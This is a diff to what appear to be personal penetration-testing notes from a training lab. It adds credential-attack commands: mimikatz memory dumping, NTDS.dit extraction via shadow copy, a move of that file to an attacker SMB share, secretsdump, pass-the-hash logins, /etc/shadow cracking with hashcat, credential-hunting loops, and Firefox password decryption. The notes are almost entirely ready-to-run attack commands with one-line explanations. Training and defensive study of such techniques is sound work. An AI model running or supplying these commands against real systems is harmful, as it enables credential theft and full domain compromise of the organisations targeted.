@@ -232,3 +232,129 @@ $ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
 $ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 ```
 %% extract credentials from lsass dump file %%
+
+
+### Attacking Windows Credential Manager
+```
+C:\Users\sadams>cmdkey /list
+C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
+```
+%% cmdkey to enumerate credentials stored in current user's profile and runas to impersonate stored user %%
+
+```
+C:\Users\Administrator\Desktop> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::credman
+```
+%% dump credentials from memory using the sekurlsa module %%
+
+```
+$ msconfig.exe
+```
+%% if you get a user who is part of the local administrators group, you can run msconfig.exe and run an elevated cmd shell %%
+
+```
+$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
+```
+%% checking names against domain using kerbrute to get valid domain accounts %%
+
+```
+*Evil-WinRM* PS C:\> net localgroup
+*Evil-WinRM* PS C:\> net user bwilliamson
+```
+%% check what group a user belongs to we can use net localgroup command and net user command to check what privileges our user has %%
+
+```
+*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
+```
+%% create a shadow copy of the C: drive where NTDS will be stored %%
+
+```
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
+```
+%% copy ntds.dit to our attack machine that is hosting the SMB server %%
+
+```
+$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+```
+%% use impacket-secretsdump to dump all the hashes from NTDS.dit %%
+
+```
+$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
+```
+%% nxc shortcut to dump NTDS.dit %%
+
+```
+$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
+```
+%% if we can't crack the hash we can use pass the hash to login as that user %%
+
+### Credential hunting in windows
+```
+C:\> start LaZagne.exe all
+```
+%% download LaZagne to your windows host and run this command to search for credentials %%
+
+```
+C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+%% use findstr command to search for credentials in windows host %%
+
+### Cracking Linux Credentials
+```
+$ sudo cp /etc/passwd /tmp/passwd.bak 
+$ sudo cp /etc/shadow /tmp/shadow.bak 
+$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
+```
+%% once we have root access on a linux machine we can use unshadow then hashcat to crack the hashes stored on /etc/shadow%%
+
+### Credential Hunting in Linux
+```
+$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+%% search for configuration files %%
+
+```
+$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+```
+%% scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (user, password, pass) in each file with the file extension .cnf.%%
+
+```
+$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+```
+%% searching for databases %%
+
+```
+$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
+```
+%% search for notes %%
+
+```
+$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+```
+%% search for scripts %%
+
+```
+$ tail -n5 /home/*/.bash*
+```
+%% enumerating history files e.g .bash_history%%
+
+```
+$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+```
+%% strings to find content in the logs %%
+
+```
+$ ls -l .mozilla/firefox/ | grep default 
+$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq 
+$ python3.9 firefox_decrypt.py
+```
+%% firefox decrypt command to decrypt any passwords found in mozilla firefox %%
+
+
+```
+$ python3 laZagne.py browsers
+```
+%% LaZagne can also return results if the user has used the supported browser. %%
